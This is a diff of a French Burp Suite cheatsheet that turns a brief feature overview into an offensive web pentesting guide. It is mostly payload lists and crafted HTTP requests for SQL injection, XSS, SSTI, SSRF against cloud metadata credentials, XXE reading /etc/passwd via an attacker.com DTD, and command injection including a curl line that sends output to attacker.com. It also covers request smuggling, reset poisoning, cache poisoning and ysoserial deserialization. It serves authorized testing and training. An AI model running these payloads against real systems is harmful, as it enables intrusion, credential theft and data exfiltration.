@@ -1,85 +1,922 @@
-# 🛠 Burp Suite - Cheatsheet Cyber Sécurité
+# 🔥 Burp Suite - Cheatsheet Cyber Sécurité
 
-Ce fichier regroupe les **fonctionnalités clés** et **astuces essentielles** pour utiliser **Burp Suite** dans un contexte de tests d’intrusion web, notamment pour détecter et exploiter des vulnérabilités comme XSS, SQLi, RFI, etc.
-
----
-
-## 1️⃣ Configuration initiale
-
-- Configurer le proxy de Burp sur l’adresse locale (127.0.0.1) et port (8080 par défaut)  
-> Permet d’intercepter et modifier les requêtes HTTP/HTTPS envoyées par le navigateur.
-
-- Installer le certificat CA Burp dans le navigateur  
-> Nécessaire pour intercepter les requêtes HTTPS sans erreurs.
+Guide orienté **exploitation** et **pentesting** avec Burp Suite. Focus sur les techniques offensives et la détection de vulnérabilités.
 
 ---
 
-## 2️⃣ Interception & Analyse des requêtes
+## 1️⃣ Proxy - Interception et Manipulation
 
-- Activer l’onglet **Proxy > Intercept** pour capturer les requêtes en temps réel  
-> Modifier à la volée les requêtes avant qu’elles n’atteignent le serveur.
+### Interception de base
+```
+Proxy > Intercept > Intercept is on
+- Ctrl+F : Forward
+- Ctrl+D : Drop
+- Action > Send to Repeater (Ctrl+R)
+- Action > Send to Intruder (Ctrl+I)
+```
 
-- Utiliser **HTTP history** pour voir toutes les requêtes passées  
-> Analyse rétroactive des échanges HTTP/HTTPS.
+### Modification de requêtes critiques
 
----
+**Bypass de restrictions client-side**
+```http
+# Changer le Content-Type pour bypass upload filters
+Content-Type: image/jpeg
+→ Content-Type: application/x-php
 
-## 3️⃣ Scanner automatique (Burp Scanner - version Pro)
+# Modifier les valeurs cachées
+<input type="hidden" name="price" value="1000">
+→ <input type="hidden" name="price" value="1">
 
-- Lancer un scan de sécurité automatique sur une URL cible  
-> Identifie rapidement un grand nombre de vulnérabilités courantes.
+# Bypass de limitations JavaScript
+quantity=1&maxQuantity=10
+→ quantity=999999&maxQuantity=10
+```
 
-- Examiner les résultats dans l’onglet **Scanner > Issues**  
-> Voir les vulnérabilités détectées avec détails et recommandations.
+**Manipulation de cookies**
+```http
+# Modifier les cookies de session
+Cookie: session=eyJ1c2VyIjoiZ3Vlc3QifQ==
+→ Cookie: session=eyJ1c2VyIjoiYWRtaW4ifQ==
 
----
+# Supprimer les flags de sécurité
+Set-Cookie: session=abc; HttpOnly; Secure
+→ Set-Cookie: session=abc
+```
 
-## 4️⃣ Repeater - Tests manuels
+**Injection de headers**
+```http
+# Test SSRF
+Host: internal.server.local
+X-Forwarded-For: 127.0.0.1
+X-Forwarded-Host: attacker.com
+X-Original-URL: /admin
+X-Rewrite-URL: /admin
 
-- Envoyer une requête interceptée dans l’onglet **Repeater**  
-> Tester manuellement des modifications sur les paramètres, headers, cookies, etc.
-
-- Modifier et renvoyer la requête pour observer les réponses du serveur  
-> Permet d’affiner l’exploitation de vulnérabilités (ex: injection, XSS).
-
----
-
-## 5️⃣ Intruder - Attaques automatisées
-
-- Configurer une attaque Intruder pour tester des payloads en masse (ex: bruteforce, fuzzing)  
-> Permet d’automatiser les injections sur les paramètres vulnérables.
-
-- Choisir le type d’attaque : Sniper, Battering ram, Pitchfork, Cluster bomb  
-> En fonction du scénario et de la complexité du test.
-
-- Utiliser des listes de payloads personnalisées ou intégrées (ex: fuzzdb, SecLists)  
-> Pour maximiser la couverture des tests.
-
----
-
-## 6️⃣ Decoder & Comparer
-
-- Utiliser **Decoder** pour encoder/décoder rapidement des données (Base64, URL, Hex, etc.)  
-> Pratique pour manipuler les données transmises.
-
-- Utiliser **Comparer** pour voir les différences entre deux réponses ou requêtes  
-> Utile pour détecter des changements subtils dans les réponses.
-
----
-
-## 7️⃣ Extensions & automatisation
-
-- Installer des extensions via **BApp Store** (ex: Logger++, Autorize, etc.)  
-> Étendre les fonctionnalités de Burp Suite.
-
-- Utiliser **Burp Suite API** pour automatiser des tâches (version Pro)  
-> Intégration avec d’autres outils et scripts.
+# Test XXE
+Content-Type: application/xml
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><data>&xxe;</data>
+```
 
 ---
 
-## 📌 Ressources utiles
+## 2️⃣ Repeater - Tests Manuels Rapides
 
-- Documentation officielle : https://portswigger.net/burp/documentation  
-- Tutoriels : https://portswigger.net/web-security  
-- Payloads et listes : https://github.com/danielmiessler/SecLists  
-- Communauté et forums : https://forum.portswigger.net/  
+### Workflows d'exploitation
+
+**SQL Injection**
+```http
+# Test basique
+GET /product?id=1' OR '1'='1 HTTP/1.1
+
+# Union-based
+GET /product?id=1' UNION SELECT NULL,NULL,NULL-- HTTP/1.1
+
+# Time-based blind
+GET /product?id=1' AND SLEEP(5)-- HTTP/1.1
+
+# Boolean-based blind
+GET /product?id=1' AND 1=1-- HTTP/1.1  (True)
+GET /product?id=1' AND 1=2-- HTTP/1.1  (False)
+```
+
+**XSS Testing**
+```http
+# Reflected XSS
+GET /search?q=<script>alert(1)</script> HTTP/1.1
+
+# DOM XSS
+GET /page#<img src=x onerror=alert(1)> HTTP/1.1
+
+# Bypass filters
+<svg onload=alert(1)>
+<img src=x onerror=alert(1)>
+<iframe src="javascript:alert(1)">
+```
+
+**SSTI (Server-Side Template Injection)**
+```http
+# Jinja2/Flask
+GET /page?name={{7*7}} HTTP/1.1
+GET /page?name={{config.items()}} HTTP/1.1
+GET /page?name={{''.__class__.__mro__[1].__subclasses__()}} HTTP/1.1
+
+# Twig
+GET /page?name={{7*'7'}} HTTP/1.1
+GET /page?name={{_self.env.registerUndefinedFilterCallback("exec")}} HTTP/1.1
+```
+
+**SSRF (Server-Side Request Forgery)**
+```http
+# Test basique
+POST /api/fetch HTTP/1.1
+url=http://127.0.0.1:8080/admin
+
+# Bypass avec encodage
+url=http://127.0.0.1@example.com
+url=http://[::1]/admin
+url=http://0x7f.0x00.0x00.0x01/
+url=http://2130706433/  # Décimal pour 127.0.0.1
+
+# AWS Metadata
+url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
+```
+
+**XXE (XML External Entity)**
+```http
+POST /api/upload HTTP/1.1
+Content-Type: application/xml
+
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<data>&xxe;</data>
+
+# XXE Out-of-Band
+<!DOCTYPE foo [
+  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
+  %xxe;
+]>
+```
+
+---
+
+## 3️⃣ Intruder - Fuzzing et Brute Force
+
+### Types d'attaque
+
+**Sniper** : 1 position, 1 payload à la fois
+```
+Utilisation : Fuzzing d'un seul paramètre
+Exemple : Test de tous les SQLi payloads sur un paramètre
+```
+
+**Battering Ram** : Tous les paramètres = même payload
+```
+Utilisation : Test de credentials identiques
+Exemple : admin:admin, root:root, test:test
+```
+
+**Pitchfork** : Correspondance 1:1 entre listes
+```
+Utilisation : Liste user/pass connues
+Payload 1: admin, john, sarah
+Payload 2: pass123, doe456, connor789
+→ admin:pass123, john:doe456, sarah:connor789
+```
+
+**Cluster Bomb** : Toutes les combinaisons
+```
+Utilisation : Brute force complet
+Payload 1: admin, root, user
+Payload 2: pass, 123, admin
+→ 3x3 = 9 combinaisons
+```
+
+### Payloads d'exploitation
+
+**SQL Injection**
+```
+Position : §id§
+
+Payloads :
+' OR '1'='1
+' OR '1'='1'--
+' OR '1'='1'/*
+1' UNION SELECT NULL--
+1' AND SLEEP(5)--
+1' AND 1=1--
+1' AND 1=2--
+' OR 1=1--
+admin'--
+' OR 'a'='a
+```
+
+**XSS Payloads**
+```
+Position : §input§
+
+Payloads :
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<iframe src="javascript:alert(1)">
+"><script>alert(1)</script>
+'><script>alert(1)</script>
+</script><script>alert(1)</script>
+<body onload=alert(1)>
+```
+
+**Path Traversal**
+```
+Position : §path§
+
+Payloads :
+../
+../../
+../../../
+../../../../
+../../../../../etc/passwd
+..%2F
+..%252F
+....//
+..;/
+```
+
+**Command Injection**
+```
+Position : §cmd§
+
+Payloads :
+; whoami
+| whoami
+|| whoami
+& whoami
+&& whoami
+`whoami`
+$(whoami)
+; cat /etc/passwd
+| curl attacker.com?data=$(whoami)
+```
+
+**IDOR (Insecure Direct Object Reference)**
+```
+Position : §id§
+
+Payloads : Numbers (1-1000)
+Grep : "Access Denied", "Unauthorized", "403", "Not Found"
+→ Chercher les réponses différentes
+```
+
+### Grep - Match & Extract
+
+**Détecter les vulnérabilités**
+```
+Options > Grep - Match
+
+SQL Errors :
+- SQL syntax error
+- mysql_fetch
+- Warning: mysql
+- ORA-01
+- PostgreSQL
+
+Success Indicators :
+- Welcome admin
+- Login successful
+- Dashboard
+```
+
+**Extraire des données**
+```
+Options > Grep - Extract
+
+Extraire les CSRF tokens :
+<input type="hidden" name="csrf" value="(.+?)">
+
+Extraire des flags CTF :
+flag\{[a-zA-Z0-9_]+\}
+
+Extraire des emails :
+[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}
+```
+
+---
+
+## 4️⃣ Decoder - Encodage/Décodage
+
+### Formats supportés
+
+```
+URL Encoding        : %20 %3A %2F
+HTML Encoding       : &#60; &#62; &lt; &gt;
+Base64              : YWRtaW46cGFzc3dvcmQ=
+Hex                 : 61646d696e3a70617373776f7264
+ASCII Hex           : \x61\x64\x6d\x69\x6e
+Octal               : \141\144\155\151\156
+Binary              : 01100001 01100100
+Gzip                : Compression/décompression
+```
+
+### Exemples d'exploitation
+
+**Bypass WAF avec encodage**
+```
+Original : <script>alert(1)</script>
+
+URL Encoded : %3Cscript%3Ealert%281%29%3C%2Fscript%3E
+Double URL  : %253Cscript%253E
+HTML Entity : &#60;script&#62;alert(1)&#60;/script&#62;
+Unicode     : \u003cscript\u003ealert(1)\u003c/script\u003e
+```
+
+**Décoder des tokens**
+```
+JWT Token :
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlc3QifQ.signature
+
+Base64 decode :
+{"alg":"HS256","typ":"JWT"}.{"user":"guest"}.signature
+→ Modifier "guest" → "admin" puis re-encoder
+```
+
+---
+
+## 5️⃣ Comparer - Analyse Différentielle
+
+### Techniques d'exploitation
+
+**SQL Injection Boolean-Based**
+```
+Request 1 : /product?id=1' AND 1=1--
+Request 2 : /product?id=1' AND 1=2--
+
+Comparer les réponses :
+- Longueur différente
+- Contenu différent
+- Temps de réponse
+→ Vulnérable si différences détectées
+```
+
+**Détection de IDOR**
+```
+Request 1 : GET /api/user/123
+Request 2 : GET /api/user/124
+
+Comparer :
+- Accès autorisé vs refusé
+- Données utilisateur différentes
+→ IDOR si accès aux données d'autres users
+```
+
+**Bypass de filtres**
+```
+Request 1 : /search?q=<script>
+Request 2 : /search?q=<ScRiPt>
+
+Comparer les réponses :
+→ Si 2ème passe, filtre case-sensitive bypassé
+```
+
+---
+
+## 6️⃣ Scanner (Pro uniquement)
+
+### Configuration de scan
+
+**Scan passif automatique**
+```
+Détecte :
+- Headers de sécurité manquants
+- Information disclosure
+- Cookies non sécurisés
+- CORS mal configuré
+```
+
+**Scan actif manuel**
+```
+Right-click > Scan > Active Scan
+
+Cible :
+- OWASP Top 10
+- Injection flaws (SQLi, XSS, XXE)
+- Authentication issues
+- Logic flaws
+```
+
+### Vulnérabilités détectées
+
+**High Severity**
+```
+- SQL Injection
+- Command Injection
+- Path Traversal
+- XXE
+- SSRF
+- Deserialization
+```
+
+**Medium Severity**
+```
+- XSS (Reflected, Stored, DOM)
+- CSRF
+- CORS misconfiguration
+- Information disclosure
+- Weak credentials
+```
+
+**Low/Info**
+```
+- Missing security headers
+- Cookie without HttpOnly
+- Verbose error messages
+- Directory listing
+```
+
+---
+
+## 7️⃣ Extensions Essentielles
+
+### Extensions de pentest
+
+**Autorize** - Test IDOR automatique
+```
+Installation : BApp Store
+Utilisation :
+1. Configurer 2 sessions (user normal + admin)
+2. Naviguer en tant qu'admin
+3. Autorize teste automatiquement avec session normale
+→ Détecte les IDOR et privilege escalation
+```
+
+**Param Miner** - Découverte de paramètres cachés
+```
+Installation : BApp Store
+Utilisation :
+- Right-click > Extensions > Param Miner > Guess params
+- Découvre : headers cachés, cookies, paramètres GET/POST
+- Techniques : cache poisoning, parameter pollution
+```
+
+**JWT Editor** - Manipulation de JWT
+```
+Installation : BApp Store
+Exploitation :
+1. Intercepter un JWT
+2. Décoder le payload
+3. Modifier les claims (user, role, exp)
+4. Re-signer ou exploiter "none" algorithm
+5. Tester les key confusion attacks
+```
+
+**Turbo Intruder** - Fuzzing haute performance
+```
+Installation : BApp Store
+Utilisation :
+- Race conditions
+- Brute force rapide
+- Scripting Python avancé
+```
+
+**Upload Scanner** - Test d'upload de fichiers
+```
+Installation : BApp Store
+Tests :
+- Bypass d'extensions (.php, .phtml, .php5)
+- Bypass de Content-Type
+- Bypass de magic bytes
+- Path traversal dans filename
+```
+
+**ActiveScan++** - Scans additionnels
+```
+Installation : BApp Store
+Détecte :
+- SSTI
+- CRLF Injection
+- Host Header Injection
+- Parameter Pollution
+```
+
+**Logger++** - Logging avancé
+```
+Installation : BApp Store
+Fonctionnalités :
+- Export en CSV/JSON
+- Filtres avancés
+- Analyse de patterns
+```
+
+---
+
+## 8️⃣ Target - Sitemap et Scope
+
+### Définir le scope
+
+```
+Target > Scope > Add
+
+Include :
+^https?://target\.com.*
+^https?://.*\.target\.com.*
+
+Exclude :
+^https?://target\.com/logout
+^https?://.*\.google\.com.*
+```
+
+**Filtrer le proxy**
+```
+Proxy > Options > Intercept Client Requests
+- And URL Is in target scope
+→ N'intercepte que les requêtes du scope
+```
+
+### Analyse du sitemap
+
+**Découvrir des endpoints**
+```
+Target > Site map
+
+Chercher :
+- /admin, /administrator
+- /api, /api/v1, /api/v2
+- /backup, /.git, /.env
+- /config, /console
+- /test, /dev, /debug
+```
+
+**Endpoints sensibles**
+```
+Right-click > Engagement tools > Find comments
+Right-click > Engagement tools > Find scripts
+→ Chercher des TODO, credentials, API keys dans les commentaires
+```
+
+---
+
+## 9️⃣ Collaborator (Pro) - Out-of-Band
+
+### Exploitation SSRF
+
+```
+Payload : http://burpcollaborator.net
+
+Applications :
+1. SSRF blind detection
+2. XXE Out-of-Band
+3. DNS exfiltration
+4. SMTP header injection
+```
+
+**XXE Out-of-Band**
+```xml
+<!DOCTYPE foo [
+  <!ENTITY % xxe SYSTEM "http://YOUR-SUBDOMAIN.burpcollaborator.net/xxe">
+  %xxe;
+]>
+```
+
+**Blind SSRF**
+```http
+POST /api/webhook HTTP/1.1
+url=http://YOUR-SUBDOMAIN.burpcollaborator.net
+```
+
+---
+
+## 🔟 Match & Replace - Automatisation
+
+### Bypass de protections
+
+**Supprimer les CSP headers**
+```
+Type: Response header
+Match: Content-Security-Policy.*
+Replace: (vide)
+```
+
+**Ajouter des headers malveillants**
+```
+Type: Request header
+Match: ^Host:.*
+Replace: Host: target.com\r\nX-Forwarded-For: 127.0.0.1
+```
+
+**Modifier automatiquement les cookies**
+```
+Type: Request header
+Match: Cookie: role=user
+Replace: Cookie: role=admin
+```
+
+**Bypass de CSRF tokens**
+```
+Type: Request body
+Match: csrf=[a-zA-Z0-9]+
+Replace: csrf=VALID_TOKEN_HERE
+```
+
+---
+
+## 1️⃣1️⃣ Techniques d'Exploitation Avancées
+
+### Authentication Bypass
+
+**Password Reset Poisoning**
+```http
+POST /reset-password HTTP/1.1
+Host: target.com
+X-Forwarded-Host: attacker.com
+
+email=victim@target.com
+→ Le lien de reset est envoyé à attacker.com
+```
+
+**OAuth Exploitation**
+```
+1. Intercepter le redirect_uri
+redirect_uri=https://target.com/callback
+→ redirect_uri=https://attacker.com/callback
+
+2. CSRF sur OAuth flow
+→ Pas de state parameter
+
+3. Open Redirect
+redirect_uri=https://target.com@attacker.com
+```
+
+### Race Conditions
+
+**Coupon/Voucher Abuse**
+```
+1. Intercepter la requête d'utilisation de coupon
+2. Envoyer au Repeater
+3. Créer un groupe de requêtes (Send group in parallel)
+4. Envoyer 20+ requêtes simultanément
+→ Utiliser le même coupon plusieurs fois
+```
+
+**Account Takeover via Race Condition**
+```
+Scénario : Email change race condition
+1. Changer email en attacker@evil.com
+2. Envoyer 50 requêtes simultanées
+3. Changer email en victim@target.com
+→ Peut bypasser la validation
+```
+
+### Cache Poisoning
+
+**Web Cache Deception**
+```http
+GET /account/profile.css HTTP/1.1
+Host: target.com
+
+→ Cache stocke /account/profile avec un .css
+→ Accès non authentifié aux données cached
+```
+
+**Cache Key Poisoning**
+```http
+GET / HTTP/1.1
+Host: target.com
+X-Forwarded-Host: attacker.com
+
+→ Cache poison avec XSS dans le header
+```
+
+### HTTP Request Smuggling
+
+**CL.TE (Content-Length vs Transfer-Encoding)**
+```http
+POST / HTTP/1.1
+Host: target.com
+Content-Length: 13
+Transfer-Encoding: chunked
+
+0
+
+SMUGGLED
+```
+
+**TE.CL**
+```http
+POST / HTTP/1.1
+Host: target.com
+Content-Length: 4
+Transfer-Encoding: chunked
+
+5c
+SMUGGLED_REQUEST
+0
+
+
+```
+
+### Deserialization Attacks
+
+**PHP Object Injection**
+```
+Cookie: user=O:4:"User":2:{s:4:"name";s:5:"admin";s:4:"role";s:5:"admin";}
+→ Injecter des objets PHP malveillants
+```
+
+**Java Deserialization**
+```
+Utiliser ysoserial :
+java -jar ysoserial.jar CommonsCollections6 'whoami' | base64
+
+Injecter dans :
+- Cookie
+- ViewState (ASP.NET)
+- H2 Database (RCE)
+```
+
+---
+
+## 1️⃣2️⃣ Workflows de Pentest
+
+### Méthodologie complète
+
+**Phase 1 : Reconnaissance**
+```
+1. Crawler le site (Spider)
+2. Analyser le sitemap
+3. Identifier les technologies (Wappalyzer)
+4. Chercher les endpoints sensibles
+5. Extraire les commentaires/scripts
+```
+
+**Phase 2 : Authentification**
+```
+1. Tester les credentials par défaut
+2. Brute force avec Intruder
+3. Password reset poisoning
+4. Session fixation
+5. JWT manipulation
+6. OAuth flaws
+```
+
+**Phase 3 : Autorisation**
+```
+1. IDOR testing (Autorize extension)
+2. Privilege escalation horizontale
+3. Privilege escalation verticale
+4. Path traversal
+5. SSRF
+```
+
+**Phase 4 : Injection**
+```
+1. SQL Injection (Repeater + Intruder)
+2. XSS (Reflected, Stored, DOM)
+3. XXE
+4. SSTI
+5. Command Injection
+6. LDAP Injection
+```
+
+**Phase 5 : Logic Flaws**
+```
+1. Race conditions
+2. Business logic bypass
+3. Price manipulation
+4. Workflow bypass
+5. Mass assignment
+```
+
+**Phase 6 : Client-Side**
+```
+1. CORS misconfiguration
+2. Clickjacking
+3. WebSocket hijacking
+4. PostMessage vulnerabilities
+5. DOM-based vulns
+```
+
+---
+
+## 1️⃣3️⃣ Cheatsheet Rapide - Exploitation
+
+### SQLi Quick Tests
+```
+'
+''
+`
+``
+,
+"
+""
+/
+//
+\
+\\
+;
+' OR '1
+' OR 1 -- -
+" OR "" = "
+" OR 1 = 1 -- -
+' OR '' = '
+'='
+'LIKE'
+'=0--+
+ OR 1=1
+' OR 'x'='x
+' AND id IS NULL; --
+'''''''''''''UNION SELECT '2
+%00
+/*…*/ 
++		addition, concatenate (or space in url)
+```
+
+### XSS Payloads Rapides
+```
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<svg/onload=alert(1)>
+<iframe src="javascript:alert(1)">
+<body onload=alert(1)>
+<input onfocus=alert(1) autofocus>
+<select onfocus=alert(1) autofocus>
+<textarea onfocus=alert(1) autofocus>
+<marquee onstart=alert(1)>
+<div onwheel=alert(1)>
+```
+
+### SSTI Detection
+```
+{{7*7}}              → 49 (Jinja2, Twig)
+${7*7}               → 49 (FreeMarker)
+<%= 7*7 %>           → 49 (ERB)
+${{7*7}}             → 49 (AngularJS)
+#{7*7}               → 49 (Thymeleaf)
+*{7*7}               → 49 (Smarty)
+```
+
+### Command Injection
+```
+; whoami
+| whoami
+|| whoami  
+& whoami
+&& whoami
+`whoami`
+$(whoami)
+%0A whoami
+%0D whoami
+```
+
+### Path Traversal
+```
+../
+../../
+../../../etc/passwd
+....//....//....//etc/passwd
+..%2F..%2F..%2Fetc/passwd
+..%252F..%252F..%252Fetc/passwd
+```
+
+---
+
+## 1️⃣4️⃣ Raccourcis Clavier Essentiels
+
+```
+Ctrl + R       : Send to Repeater
+Ctrl + I       : Send to Intruder
+Ctrl + Shift+B : Send to Repeater and switch
+Ctrl + Shift+I : Send to Intruder and switch
+Ctrl + F       : Forward (dans Intercept)
+Ctrl + D       : Drop (dans Intercept)
+Ctrl + Space   : Send request (Repeater)
+Ctrl + U       : URL encode selection
+Ctrl + Shift+U : URL decode selection
+Ctrl + B       : Base64 encode
+Ctrl + Shift+B : Base64 decode
+Ctrl + H       : Hex encode
+```
+
+---
+
+## 1️⃣5️⃣ Ressources et Références
+
+### Labs pratiques
+- **PortSwigger Web Security Academy** : https://portswigger.net/web-security
+- **PentesterLab** : https://pentesterlab.com
+- **HackTheBox** : Applications web
+- **TryHackMe** : Burp Suite room
+
+### Documentation
+- Burp Suite Documentation : https://portswigger.net/burp/documentation
+- OWASP Testing Guide : https://owasp.org/www-project-web-security-testing-guide/
+- Payload All The Things : https://github.com/swisskyrepo/PayloadsAllTheThings
+
+### Extensions à connaître
+- **Autorize** - IDOR testing
+- **Param Miner** - Hidden parameters
+- **JWT Editor** - JWT manipulation
+- **Turbo Intruder** - High-speed attacks
+- **Upload Scanner** - File upload testing
+- **Logger++** - Advanced logging
+- **ActiveScan++** - Extended scans
+- **Hackvertor** - Encoding chains
+- **HTTP Request Smuggler** - Smuggling attacks
+
+---
+
+## 💡 Tips Pro Finals
+
+1. **Toujours définir un scope** pour éviter les requêtes hors cible
+2. **Utiliser Repeater pour tests rapides** avant Intruder
+3. **Match & Replace** pour automatiser les modifications répétitives
+4. **Autorize extension** indispensable pour IDOR
+5. **Logger++** pour garder trace de tout
+6. **Comparer les réponses** pour détection de vulnérabilités
+7. **JWT Editor** pour manipulation de tokens
+8. **Collaborator** pour out-of-band attacks
+9. **Turbo Intruder** pour race conditions
+10. **Toujours vérifier le scope** avant un scan actif
+
+---
+
+**🔥 Burp Suite est l'outil ultime pour le pentesting web. Maîtrisez-le et vous découvrirez des vulnérabilités que personne d'autre ne voit !**
